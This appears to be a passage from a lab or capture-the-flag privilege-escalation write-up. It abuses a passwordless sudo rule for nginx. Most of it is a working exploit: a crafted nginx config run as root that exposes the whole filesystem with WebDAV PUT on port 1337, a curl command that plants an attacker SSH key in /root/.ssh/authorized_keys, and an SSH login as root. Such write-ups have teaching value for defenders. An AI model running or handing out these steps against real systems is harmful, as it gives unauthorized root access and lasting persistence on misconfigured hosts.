(ALL : ALL) NOPASSWD: /usr/sbin/nginx

pwn.conf
`user root;`
`worker_processes 4;`
`pid /tmp/nginx.pid;`
`events {`
	`worker_connections 768;`
`}`
`http {`
	`server {`
		`listen 1337;`
		`root /;`
		`autoindex on;`
		`dav_methods PUT;`
	`}`
`}`
sudo nginx -c /tmp/pwn.conf
ss -tlpn

To verify that our malicious configuration is active, we check the open ports using ss :
We see that port 1337 is in fact open, so we proceed with the final step, which is writing our
public SSH key to /root/.ssh/authorized_keys .

niva@NLab:/tmp$ ssh-keygen

curl -X PUT localhost:1337/root/.ssh/authorized_keys -d "$(cat root.pub)"

ssh -i root root@localhost

